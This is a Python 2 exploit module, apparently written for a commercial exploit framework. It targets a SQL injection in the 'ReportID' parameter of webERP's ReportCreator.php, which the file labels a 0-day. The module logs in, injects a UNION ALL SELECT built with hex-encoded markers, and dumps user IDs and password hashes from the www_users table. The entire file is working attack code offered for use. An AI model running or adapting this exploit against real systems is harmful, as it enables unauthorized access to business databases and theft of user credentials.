#!/usr/bin/env python

import sys
import urllib2
import urllib
import cookielib
import re
import ssl
from collections import OrderedDict
from Sploit import Sploit
ssl._create_default_https_context = ssl._create_unverified_context


INFO = {}
INFO['NAME'] = "efa_weberp_sqli"
INFO['DESCRIPTION'] = "webERP SQL Injection"
INFO['VENDOR'] = "http://www.weberp.org/"
INFO["CVE Name"] = "[0-day]"
INFO["NOTES"] = """
    Parameter 'ReportID' at 'reportwriter/admin/ReportCreator.php' is vulnerable to SQLi. Authentication required.
Tested against webERP 4.14.1 on Windows 7 x64 SP1.
"""
INFO["DOWNLOAD_LINK"] = "https://sourceforge.net/projects/web-erp/files/latest/download"
INFO['CHANGELOG'] = "8 Dec 2017. Written by Gleg team."
INFO['PATH'] = 'Web/'


# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = '192.168.1.176'
OPTIONS["PORT"] = 81
OPTIONS["SSL"] = False
OPTIONS["BASEPATH"] = '/weberp'
OPTIONS["USERNAME"] = 'admin'
OPTIONS["PASSWORD"] = 'password'


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS["HOST"])
        self.port = int(self.args.get('PORT', OPTIONS["PORT"]))
        self.ssl = self.args.get('SSL', OPTIONS["SSL"])
        self.basepath = self.args.get('BASEPATH', OPTIONS['BASEPATH'])
        self.username = self.args.get('USERNAME', OPTIONS['USERNAME'])
        self.password = self.args.get('PASSWORD', OPTIONS['PASSWORD'])

    def make_url(self, path=''):
        proto = 'https' if self.ssl else 'http'
        url = '%s://%s:%s' % (proto, self.host, self.port)
        uri = '/'.join(s.replace('\\', '/').strip('/') for s in [self.basepath, path] if s)
        url = url + '/' + uri if uri else url
        return url

    def str_to_hex(self, string):
        return '0x' + string.encode('hex').upper()
    
    def extract_form_id(self, content):
        form_id = re.search('<input.+name="FormID"\s+value="(.+?)"', content).group(1)
        return form_id

    def select_query(self, fields, table):
        boundary_l = self.random_string()
        boundary_r = self.random_string()
        splitter = self.random_string()
        query = 'CONCAT(' + \
                self.str_to_hex(boundary_l) + ',' + \
                (',' + self.str_to_hex(splitter) + ',').join('IFNULL(CAST(%s AS CHAR),0x20)' % f for f in fields) + \
                ',' + self.str_to_hex(boundary_r) + ')'
        url = self.make_url('reportwriter/admin/ReportCreator.php?action=step7')
        res = self.opener.open(url).read()
        form_id = self.extract_form_id(res)
        data = 'FormID=%s&ReportID=1 ' \
               'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,%s,NULL,NULL,NULL from %s -- -' % (form_id, query, table)
        res = self.opener.open(url, data).read()
        regexp = boundary_l + '(.+?)' + boundary_r
        res = re.findall(regexp, res)
        data = []
        for entry in set(res):
            data.append(entry.split(splitter))
        return data
        

    def make_table(self, header=None, data=None):
        tmp = header + data
        max_fields_width = []
        for i in range(len(header)):
            max_fields_width.append(len(max(tmp, key=lambda x: len(x[i]))[i]) + 3)
        horizontal = '+' + '+'.join('-' * width for width in max_fields_width) + '+\r\n'
        output = '\r\n' + horizontal
        output += '|' + '|'.join(header[i].center(width) for i, width in enumerate(max_fields_width)) + '|\r\n'
        output += horizontal
        sorted_data = sorted(data, key=lambda x: (x[1], x[0]))
        for entry in sorted_data:
            output += '|' + '|'.join(entry[i].ljust(width) for i, width in enumerate(max_fields_width)) + '|\r\n'
        output += horizontal
        return output

    def run(self):
        self.args()
        url = self.make_url('')
        self.log('[*] Checking connection to %s' % url)
        cookie = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
        res = opener.open(url).read()
        form_id = self.extract_form_id(res)
        data = "FormID=%s&CompanyNameField=0&UserNameEntryField=%s&Password=%s&SubmitUser=Login" % (form_id, self.username, self.password)
        self.log('[*] Trying to login')
        res = opener.open(self.make_url('index.php'), data).read()
        if 'is not a valid' in res.lower():
            self.log('[-] Credentials not valid')
            self.finish(False)
        self.log('[*] Trying to get users')
        self.opener = opener
        res = self.select_query(['userid', 'password'], 'www_users')
        table = self.make_table(['userid', 'password'], res)
        self.log('[+]\r\n' + table)
        self.finish(True)



if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()